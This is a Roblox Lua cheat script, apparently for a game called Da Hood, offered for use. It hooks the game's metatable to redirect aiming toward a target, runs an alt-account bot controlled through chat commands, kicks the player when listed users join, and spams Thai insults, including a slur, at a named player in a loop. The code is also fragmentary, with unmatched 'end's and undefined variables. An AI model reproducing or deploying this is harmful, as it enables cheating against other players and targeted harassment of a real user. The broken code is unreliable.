        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local localskid = game.Players.localPlayer
        function chat(msg)
            local A_1 = msg
            local A_2 = "All"
            local Event = ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
            Event:FireServer(A_1, A_2)
        end
        
        local targetNames = {"isthisdo23", "cruciatusadidas", "PLAYERs1", "deeralttrue", "PLAYEWR4", "dahoodbotmoney5"}
        
        function gplr(partialName)
            local lowerPartial = partialName:lower()
            for _, v in pairs(Players:GetPlayers()) do
                if v.Name:lower():sub(1, #partialName) == lowerPartial or v.DisplayName:lower():sub(1, #partialName) == lowerPartial then
                    return v
                end
            end
            return nil
        end
        
        local function PoorCharacteccr(targetPlayer)
            targetPlayer.Chatted:Connect(function(msg)
                local command = msg:lower()
                local args = string.split(msg, " ")
        
                if command:match("^!cash%.") then
                    local partialName = args[2]
                    local player = gplr(partialName)
                    if player.Name == localskid.Name then
                        Stop()
                        local args = {"DropMoney", "10000"}
                        ReplicatedStorage:WaitForChild("MainEvent"):FireServer(unpack(args))
                    end
                elseif command:match("^!bring%.") then
                    local partialName = args[2]
                    local player = gplr(partialName)
                    if player.Name == localskid.Name then
                        Stop()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
                    end
                elseif command:match("^!follow%.") then
                    local partialName = args[2]
                    local player = gplr(partialName)
                    if player.Name == localskid.Name then
                        Stop()
                        _G.Follow = game:GetService("RunService").Heartbeat:Connect(function()
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 5)
                        end)
                    end
                elseif command:match("^!unfollow%.") then
                    local partialName = args[2]
                    local player = gplr(partialName)
                    if player.Name == localskid.Name then
                        Stop()
                        if _G.Follow then _G.Follow:Disconnect() end
                    end
                elseif command:match("^!log%.") then
                    local partialName = args[2]
                    local player = gplr(partialName)
                    if player.Name == localskid.Name then
                        Stop()
                        game:Shutdown()
                    end
                elseif command:match("^!freeze%.") then
                    local partialName = args[2]
                    local player = gplr(partialName)
                    if player.Name == localskid.Name then
                        Stop()
                        player.Character.HumanoidRootPart.Anchored = true
                    end
                elseif command:match("^!sleep%.") then
                    local partialName = args[2]
                    local player = gplr(partialName)
                    if player.Name == localskid.Name then
                        Stop()
                        local char = game.Players.LocalPlayer.Character
                        local hum = char:FindFirstChildOfClass("Humanoid") or char:FindFirstChildOfClass("AnimationController")
                        char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0) * CFrame.Angles(math.pi * 0.5, 0, 0)
                        char.Humanoid.Sit = true
                        task.wait(0.1)
                        for _, track in pairs(hum:GetPlayingAnimationTracks()) do
                            track:Stop()
                        end
                    end
                elseif command == "!unfreeze." then
                    local partialName = args[2]
                    local player = gplr(partialName)
                    if player.Name == localskid.Name then
                        Stop()
                        player.Character.HumanoidRootPart.Anchored = false
                    end
                elseif command:match("^!reset%.") then
                    local partialName = args[2]
                    local player = gplr(partialName)
                    if player.Name == localskid.Name then
                        Stop()
                        ReplicatedStorage.MainEvent:FireServer("ResetNew")
                        player.Character.Humanoid:ChangeState('Dead')
                    end
                elseif command == "/e ok" or command == "/e test" then
                    chat("HELLO")
                elseif command == "!rejoin." then
                    local partialName = args[2]
                    local player = gplr(partialName)
                    if player.Name == localskid.Name then
                        Stop()
                        game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
                    end
                elseif command == "!dance." then
                    local partialName = args[2]
                    local player = gplr(partialName)
                    if player.Name == localskid.Name then
                        Stop()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
                        local danceAnim = Instance.new('Animation')
                        danceAnim.AnimationId = "rbxassetid://11710529975"
                        game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(danceAnim):Play()
                    end
                end
            end)
        end
        
        -- Check existing players
        for _, targetName in pairs(targetNames) do
            local player = Players:FindFirstChild(targetName)
            if player then
                print(targetName .. " in server")
                PoorCharacteccr(player)
            end
        end
        
        -- Connect to new players joining
        Players.PlayerAdded:Connect(function(newPlayer)
            for _, targetName in pairs(targetNames) do
                if newPlayer.Name == targetName then
                    print(targetName .. " just joined")
                    task.wait(1)
                    PoorCharacteccr(newPlayer)
                end
            end
        end)
        
        
        
        rs.Stepped:Connect(function()
            if game.Players.LocalPlayer.PlayerGui.MainScreenGui.Crew.CrewFrame.Visible == true then
                game.Players.LocalPlayer.PlayerGui.MainScreenGui.Crew.CrewFrame.Visible = false
            end
          for i,v in pairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                if     (v.Animation.AnimationId:match("rbxassetid://2788315673"))
                    or (v.Animation.AnimationId:match("rbxassetid://2788316350"))
                    or (v.Animation.AnimationId:match("rbxassetid://2788309317"))
                    or (v.Animation.AnimationId:match("rbxassetid://2788309982"))
                    or (v.Animation.AnimationId:match("rbxassetid://2788313790"))
                    or (v.Animation.AnimationId:match("rbxassetid://2788312709"))
                    or (v.Animation.AnimationId:match("rbxassetid://2877910736"))
                    or (v.Animation.AnimationId:match("rbxassetid://2788292075"))
                    or (v.Animation.AnimationId:match("rbxassetid://3354699999"))
                    or (v.Animation.AnimationId:match("rbxassetid://3033700364"))
                    or (v.Animation.AnimationId:match("rbxassetid://2788314837"))
                    or (v.Animation.AnimationId:match("rbxassetid://2968344043")) then
                  v:Stop();
             end
            end
        end)
            
        --respawn
        STAND.CharacterAdded:connect(function()
            STAND.Character:WaitForChild("FULLY_LOADED_CHAR")
            if DOINGFARM then return end
            print("DOINGFARM = false")
            Summon()  
            if AutoMask == true then MaskHide() end
        end)
        STAND.CharacterAdded:connect(function() follow = false noclip = false looking = false STAND.Character:WaitForChild("FULLY_LOADED_CHAR") FollowMode() ANIMATION() end)
        OWNER.CharacterAdded:connect(function() STAND.Character:WaitForChild("FULLY_LOADED_CHAR") getHumanoid(OWNER):GetPropertyChangedSignal("MoveDirection"):Connect(Moved) end)
        if Hidescreen == true then rs:Set3dRenderingEnabled(false) else rs:Set3dRenderingEnabled(true) end  
        local mt = getrawmetatable(game)
        local old = mt.__namecall
        setreadonly(mt,false)
        mt.__namecall = newcclosure(function(...)
            local args = {...}
            if Locking == true and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePosI2" then
                if resolve == true then
                    args[3] = TARGET.Character.HumanoidRootPart.Position + Vector3.new(0, 1, 0) + (TARGET.Character.Humanoid.MoveDirection * gunkillprediction * TARGET.Character.Humanoid.WalkSpeed)
                else
                    args[3] = TARGET.Character.HumanoidRootPart.Position + Vector3.new(0, 1, 0) + (TARGET.Character.HumanoidRootPart.Velocity * gunkillprediction)
                end
        
                return old(unpack(args))
            end
            return old(...)
        end)
        
        for i,v in pairs(game.Players:GetChildren()) do
            v.Chatted:Connect(function(msg)
                output(v, msg)
            end)
        end
        
        game.Players.ChildAdded:Connect(function(plr)
            if plr:IsA("Player") then
                plr.Chatted:Connect(function(msg)
                    output(plr, msg)
                end)
            end
        end)
        end
        
        for _, v in ipairs(game.Workspace:GetDescendants()) do
            if v:IsA("Seat") then
                v:Destroy()
            end
        end
    end
end


function reload()
    while wait() do
        if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
            if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo") then
                if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo").Value <= 0 then
                    game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload", game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")) 
                    wait(1)
                end
            end
        end
    end
end
    
reload()
    if _G.autoreload then _G.autoreload:Disconnect() end
    _G.autoreload = game.Players.LocalPlayer.CharacterAdded:connect(function()
        game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
        wait(0.5)
        Anti()
    end)


    local annoying = {"JokeTheFool","XK5NG","bordorordo","23XxFranxX23","VelocityMover", "Sherosama", "Papa_Mbaye", "AStrongMuscle", "streetren", "NikoSenpai", "WashedGarage", "iumu", "Benoxa", "Luutyy", "clubstar54", "givkitheth", "kywiexcx", "ATKDrizzy", "dtbbullet", "XavierWildYT", "RogueDaHoodKing", "paxxythecreator", "NatsuDBlaze", "AnqelicMar", "DrBlakMD", "DarkWhirlwind", "coreten", "LegacyCross", "Greed_Ocean"} -- you can add more players by doing {"Player1", "Player2"}
 
game.Players.PlayerAdded:Connect(function(plr)
for i, v in pairs(annoying) do
if plr.Name == v then
local loc = game.Players.LocalPlayer
loc:Kick("อย่ารันสคริพในเซิฟเพราะไม่อยากให้รันเซิฟนี้")
end
end
end)



function chat(msg)
    local A_1 = msg
    local A_2 = "All"
    local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
    Event:FireServer(A_1, A_2)
    end
    local delay = 0.1 -- Adjust this value to control the speed
    local timer = 0
    local waitTime = 30
    local waiting = false
    if _G.Chatloop then _G.Chatloop:Disconnect() end
    _G.Chatloop = game:GetService("RunService").Heartbeat:Connect(function(deltaTime)
    timer = timer + deltaTime
    
    -- Check if we are not waiting
    if not waiting then
    if timer >= delay then
        if game.Players:FindFirstChild("poohvvff") then
            chat("ไอตุ๊ด "..game.Players.poohvvff.DisplayName)
            chat("จอก")
            chat("โปรปัญญาอ่อน")

            print("Running code")
            timer = 0 -- Reset the timer
            
            -- Set waiting to true and start the wait
            waiting = true
            coroutine.wrap(function()
                wait(waitTime)
                waiting = false -- Reset waiting after waitTime seconds
            end)()
        end
    end
    end
    end)
    
